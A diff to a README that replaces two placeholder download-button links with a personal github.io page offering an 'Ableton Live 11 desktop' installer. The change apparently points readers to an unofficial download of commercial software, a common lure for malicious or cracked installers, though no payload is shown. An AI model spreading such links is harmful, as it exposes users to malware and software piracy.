@@ -17,7 +17,7 @@ Format support covers the standard multitrack, MIDI, and VST hosting surface, wi
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cathycollins-io08.github.io/ableton-live-11-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with other installations of the same lineage is supported when insta
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cathycollins-io08.github.io/ableton-live-11-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
